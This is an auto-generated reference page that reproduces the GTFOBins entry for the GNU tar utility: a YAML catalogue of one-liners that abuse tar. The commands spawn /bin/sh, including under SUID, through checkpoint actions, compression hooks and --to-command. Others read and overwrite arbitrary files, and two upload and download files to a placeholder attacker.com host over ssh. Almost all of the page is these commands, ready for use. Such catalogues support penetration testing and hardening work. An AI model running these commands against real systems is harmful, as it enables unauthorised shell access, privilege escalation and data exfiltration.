---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tar

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tar` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [tar](../../tools/linux/tar.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | tar |
| name | tar |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/tar/ |

## Preserved Source Material

```yaml
_body: ''
_name: tar
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar
functions:
  download:
  - code: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
    comment: The attacker box must have the `rmt` utility installed.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: ssh-server
    version: GNU
  file-read:
  - code: tar cf /dev/stdout /path/to/input-file -I 'tar xO'
    comment: The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: GNU
  file-write:
  - code: 'echo DATA >/path/to/temp-file

      tar cf /path/to/temp-file.tar /path/to/temp-file

      tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@'
    comment: The archive can also be prepared offline then uploaded to the target.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: GNU
  shell:
  - code: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
    contexts:
      sudo: null
      suid:
        code: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
        shell: false
      unprivileged: null
    version: GNU
  - code: 'echo ''/bin/sh 0<&1'' >/path/to/temp-file

      tar cf /path/to/temp-file.tar /path/to/temp-file

      tar xf /path/to/temp-file.tar --to-command /bin/sh'
    comment: The archive can also be prepared offline then uploaded to the target.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: GNU
  upload:
  - code: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
    comment: The attacker box must have the `rmt` utility installed.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: ssh-server
    version: GNU
```
